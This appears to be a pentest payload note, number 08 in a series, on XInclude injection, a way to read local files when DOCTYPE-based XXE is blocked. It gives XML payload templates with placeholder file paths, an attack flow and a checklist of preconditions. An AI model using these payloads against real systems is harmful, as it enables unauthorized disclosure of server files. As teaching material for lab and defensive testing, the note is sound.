# Payload 08 – XInclude

## Purpose

Test whether XInclude can be used to retrieve or include external content when traditional `DOCTYPE`-based XXE is blocked.

---

## Basic XInclude Structure

```xml
<xi:include
    xmlns:xi="http://www.w3.org/2001/XInclude"
    href="RESOURCE"
    parse="text"/>
```

---

## File Retrieval Structure

For an authorized lab environment, replace `RESOURCE` with the intended local resource.

```xml
<xi:include
    xmlns:xi="http://www.w3.org/2001/XInclude"
    href="file:///PATH/TO/FILE"
    parse="text"/>
```

---

## Example XML

```xml
<?xml version="1.0"?>

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include
        href="file:///PATH/TO/FILE"
        parse="text"/>
</foo>
```

---

## Attack Flow

```text
XML Input
    ↓
XInclude
    ↓
Referenced Resource
    ↓
XML Parser
    ↓
Included Content
    ↓
Application Response
```

---

## Requirements

```text
☐ XML input is controllable
☐ XInclude is supported
☐ XInclude processing is enabled
☐ Referenced resource is accessible
☐ Included content is observable
```

---

## Key Learning

Blocking `DOCTYPE` does not necessarily eliminate every XML-related attack surface. XInclude should be considered when the parser supports it.